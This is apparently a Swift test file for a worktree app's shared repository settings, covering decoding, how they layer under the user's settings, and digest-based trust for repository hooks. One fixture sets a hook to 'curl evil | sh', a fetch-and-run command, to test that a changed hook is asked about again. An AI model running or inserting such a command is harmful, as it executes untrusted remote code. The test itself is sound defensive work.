import Foundation
import Testing

@testable import MultishellCore

/// The repository's `.multishell.json`, and how it layers under the user's
/// own settings.
@Suite
struct SharedProjectSettingsTests {
  private func decode(_ json: String) throws -> SharedProjectSettings {
    try JSONDecoder().decode(SharedProjectSettings.self, from: Data(json.utf8))
  }

  /// The value as the app has it: written to a repository and read back, so
  /// its digest is the sha256 of real bytes, which is what a hook decision
  /// is held against.
  private func asRead(_ settings: SharedProjectSettings) throws -> SharedProjectSettings {
    let root = URL(fileURLWithPath: NSTemporaryDirectory())
      .appendingPathComponent("ms-shared-\(UUID().uuidString)", isDirectory: true)
    try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: root) }
    try settings.write(to: root)
    return try #require(try SharedProjectSettings.load(from: root))
  }

  @Test func everyFieldIsOptionalAndAWrongTypeCostsThatFieldOnly() throws {
    let shared = try decode(
      #"{ "branchPrefix": "team/", "iconTint": "blue", "postCreateHook": ["npm"], "iconGlyph": "🚀" }"#
    )
    #expect(shared.branchPrefix == "team/")
    #expect(shared.iconTint == nil && shared.postCreateHook == nil)
    #expect(shared.iconGlyph == "🚀")
    #expect(try decode("{}") == SharedProjectSettings())
    #expect(throws: DecodingError.self) { try decode("[1, 2]") }
  }

  /// A blank hook is not a hook to be trusted, and a blank file list links
  /// nothing, so for those blank and absent come to the same thing.
  @Test func blankStringsReadAsAbsentWhereNoneAndNoOpinionAgree() throws {
    let shared = try decode(
      #"{ "preCreateHook": "", "postCreateHook": "  ", "linkedPaths": "", "iconGlyph": "" }"#)
    #expect(shared.preCreateHook == nil && shared.postCreateHook == nil)
    #expect(shared.linkedPaths == nil && shared.iconGlyph == nil)
    #expect(!shared.hasHooks, "or the trust question would ask about an empty script")
  }

  /// The three worktree fields are the exception: blank is the only way they
  /// say "none", so a file that says it must be able to.
  @Test func aBlankWorktreeFieldIsAnOpinionAndNotAnAbsence() throws {
    let shared = try decode(
      #"{ "worktreeDirectory": "  ", "branchPrefix": "", "defaultBranch": "" }"#)
    #expect(shared.worktreeDirectory == "  ")
    #expect(shared.branchPrefix == "")
    #expect(shared.defaultBranch == "")

    let layered = ProjectSettings().layered(over: shared)
    let defaults = WorktreeSettings(worktreeDirectory: "/global/trees", branchPrefix: "team/")
    #expect(
      layered.effective(defaults: defaults).branchPrefix == "",
      "the file's no-prefix beats the reader's global")
  }

  /// The text is what the question shows, and names each hook so the user
  /// can see which stage would run what. The decision itself is held
  /// against the file's digest.
  @Test func theHooksTextNamesEachHookSoTheQuestionSaysWhichStageRunsWhat() {
    let one = SharedProjectSettings(postCreateHook: "npm ci")
    #expect(one.hooksText == "post-create:\nnpm ci")
    let two = SharedProjectSettings(postCreateHook: "npm ci", preDeleteHook: "exit 1")
    #expect(two.hooksText == "post-create:\nnpm ci\n\npre-delete:\nexit 1")
    #expect(one.hooksText != two.hooksText, "a hook added is shown")
    #expect(SharedProjectSettings(branchPrefix: "x/").hooksText == nil)
  }

  @Test func loadReturnsNilForARepositoryWithoutTheFileAndThrowsForABrokenOne() throws {
    let root = URL(fileURLWithPath: NSTemporaryDirectory())
      .appendingPathComponent("ms-shared-\(UUID().uuidString)", isDirectory: true)
    try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: root) }

    #expect(try SharedProjectSettings.load(from: root) == nil)
    try #"{ "branchPrefix": "team/" }"#.write(
      to: SharedProjectSettings.file(in: root), atomically: true, encoding: .utf8)
    let loaded = try #require(try SharedProjectSettings.load(from: root))
    #expect(loaded.branchPrefix == "team/")
    #expect(
      loaded.digest
        == FileDigest.sha256(of: try Data(contentsOf: SharedProjectSettings.file(in: root))),
      "the digest is of the file's bytes, and is what a hook decision is held against")
    try "not json".write(
      to: SharedProjectSettings.file(in: root), atomically: true, encoding: .utf8)
    #expect(throws: (any Error).self) { try SharedProjectSettings.load(from: root) }
  }

  @Test func theUsersValuesWinAndTheFileFillsWhatTheyLeftBlank() throws {
    let shared = try asRead(
      SharedProjectSettings(
        worktreeDirectory: "../trees", branchPrefix: "team/", defaultBranch: "develop",
        postCreateHook: "npm ci", iconGlyph: "hammer", iconTint: 4))
    let blank = ProjectSettings().layered(over: shared)
    #expect(blank.worktreeDirectory == "../trees" && blank.branchPrefix == "team/")
    #expect(blank.defaultBranch == "develop", "a repository may name the branch it merges into")
    #expect(blank.iconGlyph == "hammer" && blank.iconTint == 4)
    #expect(blank.postCreateHook == "", "hooks wait for trust")

    let own = ProjectSettings(
      branchPrefix: "me/", defaultBranch: "trunk", postCreateHook: "make", iconTint: 1,
      sharedHooks: [SharedHooksDecision(digest: try #require(shared.digest), trusted: true)]
    ).layered(over: shared)
    #expect(own.worktreeDirectory == "../trees", "left blank, so the file's")
    #expect(own.branchPrefix == "me/" && own.iconTint == 1)
    #expect(own.defaultBranch == "trunk", "the user's name stands over the file's")
    #expect(own.postCreateHook == "make", "the user's hook stands over the file's")

    #expect(
      ProjectSettings(branchPrefix: "me/").layered(over: nil)
        == ProjectSettings(branchPrefix: "me/"))
  }

  /// A repository may ship what its worktrees open, so a team gets the same
  /// setup without each person finding the settings. Unlike a hook, this
  /// runs nothing the repository wrote: it starts the shell or the agent
  /// the user themselves chose, so it needs no trust decision.
  @Test func aRepositoryMaySayWhatItsWorktreesOpenAndTheUsersOwnAnswerWins() throws {
    let shared = try decode(
      #"{ "autoStartAgent": true, "autoStartAgentOnCreate": true, "opensTerminalOnSelect": false, "opensTerminalOnCreate": true }"#
    )
    #expect(shared.autoStartAgent == true && shared.autoStartAgentOnCreate == true)
    #expect(shared.opensTerminalOnSelect == false && shared.opensTerminalOnCreate == true)

    let blank = ProjectSettings().layered(over: shared)
    #expect(blank.autoStartAgent == true && blank.autoStartAgentOnCreate == true)
    #expect(blank.opensTerminalOnSelect == false && blank.opensTerminalOnCreate == true)

    let own = ProjectSettings(autoStartAgent: false, opensTerminalOnSelect: true)
      .layered(over: shared)
    #expect(own.autoStartAgent == false, "the user's off stands over the file's on")
    #expect(own.opensTerminalOnSelect == true)
    #expect(own.autoStartAgentOnCreate == true, "left alone, so the file's")

    let exported = SharedProjectSettings(exporting: blank)
    #expect(exported.autoStartAgentOnCreate == true && exported.opensTerminalOnSelect == false)
  }

  @Test func aGlyphNoBuildDrawsIsNotAChoiceAndDoesNotMaskTheRepositorys() throws {
    let shared = try decode(#"{ "iconGlyph": "server.rack", "iconTint": 4 }"#)

    let blank = ProjectSettings().layered(over: shared)
    #expect(blank.iconGlyph == "server.rack" && blank.iconTint == 4)

    let own = ProjectSettings(iconGlyph: "cylinder").layered(over: shared)
    #expect(own.iconGlyph == "cylinder", "the user's choice stands over the file's")

    let leftover = ProjectSettings(iconGlyph: "🚀").layered(over: shared)
    #expect(
      leftover.iconGlyph == "server.rack",
      "an emoji from a build that offered them is a gap, not a choice over the file")

    let fileEmoji = try decode(#"{ "iconGlyph": "🚀" }"#)
    #expect(ProjectSettings().layered(over: fileEmoji).iconGlyph == nil, "and neither way round")
  }

  /// Whatever is stored either side, and however it got there, what the app
  /// reads is a symbol name or nothing, and a trip out through the
  /// repository's file and back does not change it.
  @Test func theIconInForceIsAlwaysASymbolNameAndSurvivesARoundTrip() {
    let stored: [String?] = [
      nil, "", "   ", "folder", "hammer", "  hammer  ", "server.rack",
      "sparkle.magnifyingglass", "not.a.symbol", "🚀", " 🚀 ", "🚀 hammer",
    ]
    for own in stored {
      for file in stored {
        let settings = ProjectSettings(iconGlyph: own)
        for shared in [SharedProjectSettings(iconGlyph: file), nil] {
          let effective = settings.layered(over: shared)
          #expect(
            ProjectIcon.symbolName(effective.iconGlyph) == effective.iconGlyph,
            "own \(own ?? "nil"), file \(file ?? "nil"): not a symbol name")

          let exported = SharedProjectSettings(exporting: effective)
          #expect(
            ProjectSettings().layered(over: exported).iconGlyph == effective.iconGlyph,
            "own \(own ?? "nil"), file \(file ?? "nil"): changed by the round trip")
        }
      }
    }
  }

  @Test func aRepositoryMaySayWhatOrderItsWorktreesListInAndTheUsersOwnWins() throws {
    let shared = try decode(
      #"{ "worktreeSortOrder": "committedNewestFirst", "showsActiveWorktreesFirst": true }"#)
    #expect(shared.worktreeSortOrder == .committedNewestFirst)
    #expect(shared.showsActiveWorktreesFirst == true)

    let blank = ProjectSettings().layered(over: shared)
    #expect(blank.worktreeSortOrder == .committedNewestFirst, "the gap the user left")
    #expect(blank.showsActiveWorktreesFirst == true)

    let own = ProjectSettings(
      worktreeSortOrder: .alphabetical, showsActiveWorktreesFirst: false
    ).layered(over: shared)
    #expect(own.worktreeSortOrder == .alphabetical, "the user's choice stands over the file's")
    #expect(own.showsActiveWorktreesFirst == false)

    // What Export writes back out, so a round trip through the file keeps
    // the order the project is actually using.
    let exported = SharedProjectSettings(exporting: blank)
    #expect(exported.worktreeSortOrder == .committedNewestFirst)
    #expect(exported.showsActiveWorktreesFirst == true)
    let written = try decode(String(decoding: try JSONEncoder().encode(exported), as: UTF8.self))
    #expect(written == exported)
  }

  /// An order a newer build named, or a typo someone committed, must not
  /// cost the rest of the file or override the user's own choice.
  @Test func anOrderTheBuildDoesNotKnowCostsThatKeyOnly() throws {
    let shared = try decode(
      #"{ "worktreeSortOrder": "byMergeState", "branchPrefix": "team/" }"#)
    #expect(shared.worktreeSortOrder == nil)
    #expect(shared.branchPrefix == "team/")
    #expect(ProjectSettings().layered(over: shared).worktreeSortOrder == nil, "follows the global")

    let wrongType = try decode(#"{ "worktreeSortOrder": 3 }"#)
    #expect(wrongType.worktreeSortOrder == nil)
    let wrongFlag = try decode(
      #"{ "showsActiveWorktreesFirst": "yes", "worktreeSortOrder": "createdOldestFirst" }"#)
    #expect(wrongFlag.showsActiveWorktreesFirst == nil)
    #expect(wrongFlag.worktreeSortOrder == .createdOldestFirst, "the good key survives")
  }

  /// The raw values travel in a committed file, so they are part of its
  /// format: this pins every one of them, and fails if a case is renamed
  /// rather than added.
  @Test func theStoredNamesAreTheFileFormat() {
    #expect(
      WorktreeSortOrder.allCases.map(\.rawValue) == [
        "alphabetical", "createdNewestFirst", "createdOldestFirst", "committedNewestFirst",
        "committedOldestFirst",
      ])
  }

  @Test func aFlagOfTheWrongTypeCostsThatFlagOnly() throws {
    let shared = try decode(#"{ "autoStartAgent": "yes", "opensTerminalOnCreate": false }"#)
    #expect(shared.autoStartAgent == nil)
    #expect(shared.opensTerminalOnCreate == false)
  }

  /// Linking and copying work inside the checkout the user already has
  /// and run nothing, so neither list is part of the hook question and
  /// both apply straight away.
  @Test func aRepositoryMaySayWhatNewWorktreesAreGivenWithoutBeingTrusted() throws {
    let shared = try decode(
      #"{ "copiedPaths": ".env\n.env.local", "linkedPaths": "node_modules" }"#)
    #expect(!shared.hasHooks, "a file list is not a hook and is not asked about")
    let layered = ProjectSettings().layered(over: shared)
    #expect(layered.copiedPaths == ".env\n.env.local" && layered.linkedPaths == "node_modules")
    let own = ProjectSettings(linkedPaths: "vendor", copiedPaths: ".env")
    #expect(own.layered(over: shared).copiedPaths == ".env", "the user's list wins whole")
    #expect(own.layered(over: shared).linkedPaths == "vendor")
    #expect(ProjectSettings(copiedPaths: " ").layered(over: shared).copiedPaths == " ")
    #expect(ProjectSettings(linkedPaths: " ").layered(over: shared).linkedPaths == " ")
  }

  @Test func sharedHooksRunOnlyWhenTrustedAndOnlyWhileTheFileIsTheOneTrusted() throws {
    let shared = try asRead(
      SharedProjectSettings(postCreateHook: "npm ci", preDeleteHook: "exit 1"))
    let digest = try #require(shared.digest)
    let asked = ProjectSettings()
    #expect(asked.needsHookDecision(for: shared) && !asked.trustsHooks(of: shared))

    let trusted = ProjectSettings(sharedHooks: [SharedHooksDecision(digest: digest, trusted: true)])
    #expect(trusted.trustsHooks(of: shared) && !trusted.needsHookDecision(for: shared))
    let layered = trusted.layered(over: shared)
    #expect(layered.postCreateHook == "npm ci" && layered.preDeleteHook == "exit 1")
    #expect(layered.preCreateHook == "", "a hook the file does not have stays blank")

    let declined = ProjectSettings(
      sharedHooks: [SharedHooksDecision(digest: digest, trusted: false)])
    #expect(!declined.trustsHooks(of: shared) && !declined.needsHookDecision(for: shared))
    #expect(declined.layered(over: shared).postCreateHook == "")

    let changed = try asRead(
      SharedProjectSettings(postCreateHook: "curl evil | sh", preDeleteHook: "exit 1"))
    #expect(!trusted.trustsHooks(of: changed), "a changed hook is not in a file trusted")
    #expect(trusted.needsHookDecision(for: changed), "and is asked about again")

    // The bytes and not the scripts: another key edited is another file,
    // and asks again about hooks that did not change.
    let alsoPrefixed = try asRead(
      SharedProjectSettings(
        branchPrefix: "team/", postCreateHook: "npm ci", preDeleteHook: "exit 1"))
    #expect(alsoPrefixed.hooksText == shared.hooksText)
    #expect(!trusted.trustsHooks(of: alsoPrefixed) && trusted.needsHookDecision(for: alsoPrefixed))

    // Settings that came from no file are held against no digest at all.
    let unread = SharedProjectSettings(postCreateHook: "npm ci", preDeleteHook: "exit 1")
    #expect(!trusted.trustsHooks(of: unread) && !trusted.needsHookDecision(for: unread))
    #expect(trusted.layered(over: unread).postCreateHook == "")
  }

  /// The file is tracked, so it differs between branches. An answer per
  /// file means a switch back to a branch already answered for asks
  /// nothing, where one last answer asked on every switch.
  @Test func anAnswerIsKeptPerFileSoTwoBranchesHooksAreEachAskedAboutOnce() throws {
    let main = try asRead(SharedProjectSettings(postCreateHook: "npm ci"))
    let feature = try asRead(SharedProjectSettings(postCreateHook: "make bootstrap"))
    var settings = ProjectSettings()
    settings.recordSharedHooks(file: try #require(main.digest), trusted: true)
    settings.recordSharedHooks(file: try #require(feature.digest), trusted: false)

    #expect(!settings.needsHookDecision(for: main), "switching back asks nothing")
    #expect(
      settings.trustsHooks(of: main) && settings.layered(over: main).postCreateHook == "npm ci")
    #expect(!settings.needsHookDecision(for: feature), "and the no is remembered too")
    #expect(!settings.trustsHooks(of: feature))
    #expect(settings.layered(over: feature).postCreateHook == "")

    // An answer given again is the one that stands, and is not stored twice.
    settings.recordSharedHooks(file: try #require(feature.digest), trusted: true)
    #expect(settings.sharedHooks.count == 2 && settings.trustsHooks(of: feature))
  }

  @Test func theOldestAnswerIsDroppedSoAnEditedFileCannotGrowTheStateForever() {
    var settings = ProjectSettings()
    let digests = (0...ProjectSettings.rememberedSharedHooks).map {
      FileDigest.sha256(of: Data("post-create:\necho \($0)".utf8))
    }
    for digest in digests { settings.recordSharedHooks(file: digest, trusted: true) }
    #expect(settings.sharedHooks.count == ProjectSettings.rememberedSharedHooks)
    #expect(settings.sharedHooks.first?.digest == digests.last, "the newest answer is kept")
    #expect(
      settings.decision(aboutFile: digests[0]) == nil,
      "the file longest unanswered-about is the one dropped")
  }

  @Test func aWhitespaceOnlyHookOfTheUsersTurnsTheFilesOff() throws {
    let shared = try asRead(SharedProjectSettings(postCreateHook: "npm ci"))
    let optedOut = ProjectSettings(
      postCreateHook: " ",
      sharedHooks: [SharedHooksDecision(digest: try #require(shared.digest), trusted: true)]
    ).layered(over: shared)
    #expect(optedOut.postCreateHook == " ", "kept as the user's none, not replaced")
  }
}

@Suite
struct ProjectNameTests {
  @Test func aBareRepositoryIsNamedWithoutItsSuffixOrByTheFolderThatHidesIt() {
    #expect(Project(path: URL(fileURLWithPath: "/w/demo")).name == "demo")
    #expect(Project(path: URL(fileURLWithPath: "/w/demo.git")).name == "demo")
    #expect(Project(path: URL(fileURLWithPath: "/w/demo/.bare")).name == "demo")
    #expect(Project(path: URL(fileURLWithPath: "/w/demo/.git")).name == "demo")
  }
}
